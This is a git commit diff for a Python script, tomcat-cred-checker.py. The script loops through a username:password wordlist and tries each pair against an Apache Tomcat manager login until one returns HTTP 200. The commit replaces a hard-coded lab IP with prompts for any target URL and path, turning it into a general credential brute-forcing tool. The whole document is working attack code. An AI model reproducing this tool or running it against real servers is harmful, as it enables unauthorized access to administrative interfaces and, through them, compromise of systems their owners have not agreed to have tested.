00171534e133eb1a371b068eb6f8335ff1ad873b
Ben Velesig <benjaminvelesig@protonmail.com>
2020-02-04 16:51:06 -0500

    Made it more generic
    Now asks for UN\PW list location. 
    Now asks for base URL and URL extensions. 
    Test connection based off of base URL and stops if any connection error occurs

--- tomcat-cred-checker.py
+++ tomcat-cred-checker.py
@@ -2,12 +2,25 @@
 
 import sys
 import requests
+from pip._vendor.distlib.compat import raw_input
 
-with open('./pwd-lists/tomcat-betterdefaultpasslist.txt') as f:
+wdlistdir = input("Enter file location and name, ie., ~\Tempfile.txt of password list: ")
+baseURL = raw_input("Enter base hostname or IP (starting with http/s) of TomCat manager: ")
+URL = raw_input("Enter URL extensions (/admin/html) for TomCat manager: ")
+
+try:
+    requests.get(baseURL, timeout=4)
+except requests.exceptions.RequestException:
+    print("Web page appears to be offline or incorrect")
+    sys.exit(1)
+
+
+with open(wdlistdir) as f:
     for line in f:
         c = line.strip('\n').split(":")
-        r = requests.get('http://10.10.10.95:8080/manager/html', auth=(c[0], c[1]))
-
+        r = requests.get(baseURL + URL, auth=(c[0], c[1]))
         if r.status_code == 200:
             print("Found valid credentials\"" + line.strip('\n') + "\"")
             raise sys.exit()
+
+
